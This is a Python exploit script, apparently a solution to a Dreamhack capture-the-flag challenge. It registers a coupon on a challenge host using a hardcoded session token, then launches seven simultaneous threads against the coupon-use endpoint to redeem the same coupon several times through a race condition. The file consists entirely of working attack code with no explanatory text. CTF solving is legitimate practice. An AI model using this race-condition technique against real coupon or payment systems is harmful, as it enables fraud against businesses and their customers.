import requests
from threading import Thread

url = "http://host1.dreamhack.games:12760"

coupon = "e6ae686b9c8f3c4b8d4b25f70c5e88301b17b0f89640a95775f551ee1e6df07d"
cookie = {"session": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiZ3Vlc3QiLCJpc0xvZ2luIjp0cnVlLCJpYXQiOjE3MzY1NTkxMTB9.ExfZ3WSCVr9Q3GrMPKbg6OZ-5tbavwXQ-6N7cXiukWQ"}

requests.post(url+"/coupon/register", cookies=cookie, data={"coupon": coupon})

def useReq():
    r = requests.post(url+"/coupon/use", cookies=cookie, data={"coupon": coupon})
    if "Success" in r.text:
        print("Success")

th = Thread(target=useReq)
th1 = Thread(target=useReq)
th2 = Thread(target=useReq)
th3 = Thread(target=useReq)
th4 = Thread(target=useReq)
th5 = Thread(target=useReq)
th6 = Thread(target=useReq)
th.start()
th1.start()
th2.start()
th3.start()
th4.start()
th5.start()
th6.start()